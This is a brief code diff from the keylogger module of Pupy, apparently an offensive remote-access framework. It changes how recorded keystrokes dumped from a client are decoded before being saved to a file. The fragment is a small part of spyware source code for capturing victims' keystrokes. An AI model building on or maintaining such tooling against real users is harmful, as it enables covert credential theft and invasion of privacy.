@@ -87,7 +87,7 @@ class KeyloggerModule(PupyModule):
                 self.success("dumping recorded keystrokes in %s"%filepath)
                 self.log(data)
                 with codecs.open(filepath, 'w', encoding='utf-8') as f:
-                    f.write(data)
+                    f.write(data.decode('utf-8'))
 
         elif args.action=="stop":
             if self.client.is_windows():
